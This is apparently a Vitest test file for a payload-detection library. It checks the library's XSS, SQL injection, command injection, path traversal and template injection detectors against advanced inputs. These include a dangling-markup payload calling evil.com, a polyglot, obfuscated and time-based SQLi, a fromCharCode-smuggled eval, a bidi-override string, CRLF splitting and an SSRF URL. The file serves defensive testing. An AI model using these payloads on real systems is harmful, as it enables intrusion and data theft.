// level5.test.ts
import { describe, it, expect } from 'vitest';
import {
  detectXSS,
  detectSQLi,
  detectCommandInjection,
  detectPathTraversal,
  detectNoSQLi,
  detectTemplateInjection,
  traverseAndCheck,
  generateHash,
} from '../src/utils';
import { PayloadGuardEventType, PayloadCheckResult } from '../src/types';

describe('Level 5: Extreme Edge Cases and Advanced Attack Vectors', () => {
  describe('Zero-Day Exploit Simulations', () => {
    it('should detect dangling markup attacks', () => {
      // Dangling markup injection can lead to data exfiltration
      const payload = '<img src="https://evil.com/xss?data=';
      const result = detectXSS(payload);
      expect(result.detected).toBe(true);
    });

    it('should detect mutation-based DOM XSS without script tags', () => {
      // DOM XSS without script tags, using CSS and HTML5 features
      const payload =
        '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>';
      const result = detectXSS(payload);
      expect(result.detected).toBe(true);
    });
  });

  describe('AI-Generated Attack Vectors', () => {
    it('should detect context-aware attacks that bypass traditional defenses', () => {
      // Complex payload that might be generated by AI to evade detection
      const payload = `'--><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`;
      const result = detectXSS(payload);
      expect(result.detected).toBe(true);
    });

    it('should detect AI-optimized SQL injection with advanced syntax', () => {
      // Advanced SQLi that combines multiple evasion techniques
      const payload = `1 UNION/**/SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/0x7461626c65/**/ELSE/**/NULL/**/END`;
      const result = detectSQLi(payload);
      expect(result.detected).toBe(true);
    });
  });

  describe('Supply Chain Attack Simulations', () => {
    it('should detect obfuscated code injection in seemingly benign packages', () => {
      // Simulating malicious code hidden in a package
      const payload = `function innocent() { return x${String.fromCharCode(125, 59, 101, 118, 97, 108, 40, 39, 97, 108, 101, 114, 116, 40, 49, 41, 39, 41, 59, 123)}`;
      // The hidden part is: };eval('alert(1)');{

      const commandResult = detectCommandInjection(payload);
      const xssResult = detectXSS(payload);
      expect(commandResult.detected || xssResult.detected).toBe(true);
    });

    it('should detect code smuggling techniques', () => {
      // Payload hidden in Unicode bidirectional control characters
      const payload = 'console.log("Hello");\u202E// }gol.elosnoc;)\'1(trela{';

      // In actual rendering, the RTL override would make it execute alert(1)
      const result = detectCommandInjection(payload);
      expect(result.detected).toBe(true);
    });
  });

  describe('Protocol-Level Attacks', () => {
    it('should detect protocol smuggling attacks', () => {
      // Data URL to smuggle JavaScript
      const payload = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
      const result = detectXSS(payload);
      expect(result.detected).toBe(true);
    });

    it('should detect CRLF injection attempts', () => {
      // CRLF injection to set custom headers
      const payload =
        'user%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>';

      // This is a complex attack vector that might span multiple detection categories
      const results = [
        detectXSS(payload),
        detectCommandInjection(payload),
        detectPathTraversal(payload),
      ];

      // At least one detector should catch this
      expect(results.some(r => r.detected)).toBe(true);
    });
  });

  describe('Extreme Performance Edge Cases', () => {
    it('should handle extremely large payloads without crashing', () => {
      // Generate a very large payload to test performance boundaries
      const largePayload = '<script>'.repeat(10000) + 'alert(1)' + '</script>'.repeat(10000);

      // We're not testing if it detects, just that it completes without error
      expect(() => detectXSS(largePayload)).not.toThrow();
    });

    it('should maintain reasonable performance with deep recursive objects', () => {
      // Create a deeply nested object structure
      let deepObject: any = { value: 'safe' };
      let current = deepObject;

      // Create 1000 levels of nesting
      for (let i = 0; i < 1000; i++) {
        current.next = { value: 'safe' };
        current = current.next;

        // Insert a malicious value deep in the structure
        if (i === 950) {
          current.value = '<script>alert(1)</script>';
        }
      }

      const detectors = [detectXSS];
      const startTime = Date.now();
      const result = traverseAndCheck(deepObject, '', detectors);
      const endTime = Date.now();

      // Should detect the deeply nested XSS
      expect(result.detected).toBe(true);

      // Should complete in a reasonable time (adjust threshold as needed)
      expect(endTime - startTime).toBeLessThan(5000); // 5 seconds is very generous
    });
  });

  describe('Side-Channel Attack Simulations', () => {
    it('should detect timing-based attack patterns', () => {
      // Simulate a time-based blind injection attack
      const payload = "1; WAITFOR DELAY '0:0:5'--";
      const result = detectSQLi(payload);
      expect(result.detected).toBe(true);
    });

    it('should detect server-side request forgery attempts', () => {
      // SSRF payload attempting to access internal systems
      const payload = 'https://localhost:8080/admin';
      const result = detectPathTraversal(payload);
      expect(result.detected).toBe(true);
    });
  });

  describe('Mixed Content and Hybrid Attacks', () => {
    it('should handle mixed binary and text content', () => {
      // Create a string with binary content mixed in
      const binaryData = Uint8Array.from([0, 1, 2, 3, 4, 5]);
      const mixedContent =
        'safe' + String.fromCharCode(...binaryData) + '<script>alert(1)</script>';

      const result = detectXSS(mixedContent);
      expect(result.detected).toBe(true);
    });

    it('should detect advanced polyglot payloads targeting multiple systems', () => {
      // A sophisticated polyglot payload that works across multiple contexts
      const polyglot = `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`;

      const results: PayloadCheckResult[] = [
        detectXSS(polyglot),
        detectSQLi(polyglot),
        detectCommandInjection(polyglot),
        detectTemplateInjection(polyglot),
      ];

      // This attack should be caught by at least one detector
      expect(results.some(r => r.detected)).toBe(true);
    });
  });
});
